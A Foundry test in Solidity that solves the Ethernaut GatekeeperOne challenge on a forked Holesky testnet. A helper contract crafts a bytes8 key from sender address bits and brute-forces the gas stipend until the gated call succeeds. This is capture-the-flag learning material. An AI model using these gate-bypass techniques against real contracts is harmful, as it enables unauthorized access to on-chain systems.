// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "../../lib/forge-std/src/Test.sol";
import {Vm} from "../../lib/forge-std/src/Vm.sol";
import {GatekeeperOne} from "../../src/Ethernaut/GatekeeperOne.sol";

contract GateKeeperOneAttack is Test {
    function setUp() public {
        vm.createSelectFork(vm.rpcUrl("holesky"));
    }

    function testExploit() public {
        address playerAddress = 0xB3D6fac08D421164A414970D5225845b3A91F33F;
        vm.startPrank(playerAddress, playerAddress);
        Helper helper = new Helper();
        helper.enter();
        vm.stopPrank();

        GatekeeperOne gatekeeperOne = GatekeeperOne(
            0x07e79e0e21304FF2B68484e59155cee3974AaE11
        );
        assertTrue(gatekeeperOne.entrant() != address(0));
    }
}

contract Helper {
    function enter() public {
        bytes8 key = bytes8(uint64(uint16(uint160(msg.sender))) + (1 << 32));

        for (uint256 i = 0; i < 8191; i++) {
            (bool success, ) = address(
                0x07e79e0e21304FF2B68484e59155cee3974AaE11
            ).call{gas: i + 20000}(abi.encodeCall(GatekeeperOne.enter, key));
            if (success) {
                break;
            }
        }
    }
}
